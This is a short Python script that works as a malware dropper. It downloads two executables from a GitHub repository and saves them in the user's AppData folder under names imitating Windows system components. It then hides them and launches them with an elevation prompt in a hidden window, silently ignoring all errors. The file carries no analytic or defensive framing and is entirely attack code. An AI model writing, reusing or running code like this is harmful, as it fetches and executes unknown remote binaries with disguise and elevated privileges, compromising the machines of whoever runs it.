import os
import threading
import time
import requests
import ctypes

URL1 = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Host.Container.Runtime.exe"
URL2 = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/SvcHostManagement.exe"

APP_DATA = os.getenv('APPDATA')
PATH1 = os.path.join(APP_DATA, "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
PATH2 = os.path.join(APP_DATA, "Microsoft", "Windows", "SvcHostManagement.exe")

def download_and_run(url, path):
    try:
        r = requests.get(url)
        with open(path, 'wb') as f:
            f.write(r.content)
        os.system(f'attrib +h "{path}"')
        ctypes.windll.shell32.ShellExecuteW(None, "runas", path, None, None, 0)
    except:
        pass

def background_task():
    time.sleep(5)
    download_and_run(URL1, PATH1)
    download_and_run(URL2, PATH2)

if __name__ == "__main__":
    t = threading.Thread(target=background_task)
    t.daemon = True
    t.start()
    time.sleep(1)
